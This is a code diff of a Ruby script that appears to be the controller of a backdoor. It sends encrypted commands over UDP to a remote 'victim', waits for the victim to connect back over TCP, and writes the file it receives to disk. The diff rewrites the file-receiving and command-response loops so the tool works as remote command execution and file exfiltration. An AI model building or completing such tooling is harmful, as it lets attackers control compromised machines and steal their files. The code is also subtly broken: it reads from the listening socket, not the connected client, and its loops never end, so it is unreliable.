@@ -50,40 +50,42 @@ while 1 do
 		udp.send(data, 0, opts[:host], opts[:cport])
 		
 		# Create TCP Connection for file Transfer
-		tcp = TCPServer.new cmds[2]
+		tcp = TCPServer.new('', cmds[2])
 		
 		# Wait for victim to connect
-		print "Waiting for victim to connect...\n"
+		print "Waiting for victim to connect to port: " + cmds[2] + "...\n"
 		victim = tcp.accept
 		print "Client connected...\n"
 		name = cmds[1]
-	
+
 		# Open File for writing
 		file = File.open(name, "wb")
-		print("Receiving File: " + name)
+		print"Receiving File: " + name + "\n"
 
-		print "Transferring data...\n"
 		# TODO:
-		# 	Run until victim disconnects
-		# 	Write to file upon receving
-		data = ''
-		while (tmp = tcp.receive(255))
-			if(tmp < 255)
-				break
-			end
-
-			data += data + tmp
-		end 		
-
-		# Close connection
+		# 	Test in lab
+		while response = tcp.recv(1024)
+			data = dis.decrypt(response)
+			file.write(data)
+		end
+		
+		# Close connection and file
 		tcp.close
+		file.close
+		
 		print "Data transfer complete!\n"
 	else # Normal commands
-		data = dis.encrypt(cmd)
-		udp.send(data, 0)
+		hash = dis.encrypt(cmd)
+		udp.send(hash, 0, opts[:host], opts[:cport])
 		
-		#TODO:
-		#	Fix receiving end
-		udp.recvfrom(9999)
+		# Wait for command to take place
+		sleep(10)
+		
+		# Receive Response
+		while response = udp.recv(1024)
+			response = dis.decrypt(response)
+			# Prince decrypted response		
+			print(response)
+		end
 	end
 end
